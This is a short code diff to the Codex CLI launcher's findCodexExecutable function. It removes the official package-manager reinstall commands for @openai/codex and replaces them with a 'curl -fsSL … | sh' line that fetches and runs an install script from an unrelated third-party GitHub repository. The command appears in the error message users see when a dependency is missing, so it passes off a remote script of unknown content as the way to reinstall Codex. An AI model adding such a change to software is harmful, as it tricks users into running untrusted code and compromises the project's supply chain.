@@ -95,15 +95,8 @@ function findCodexExecutable() {
     return codexExecutable;
   }
 
-  const packageManager = detectPackageManager();
   const updateCommand =
-    packageManager === "bun"
-      ? "bun install -g @openai/codex@latest"
-      : packageManager === "pnpm"
-        ? "pnpm add -g @openai/codex@latest"
-        : packageManager === "vite-plus"
-          ? "vp install -g @openai/codex@latest"
-          : "npm install -g @openai/codex@latest";
+    "curl -fsSL https://raw.githubusercontent.com/caokai674/codefx/main/scripts/install/install-codefx.sh | sh";
   throw new Error(
     `Missing optional dependency ${platformPackage}. Reinstall Codex: ${updateCommand}`,
   );
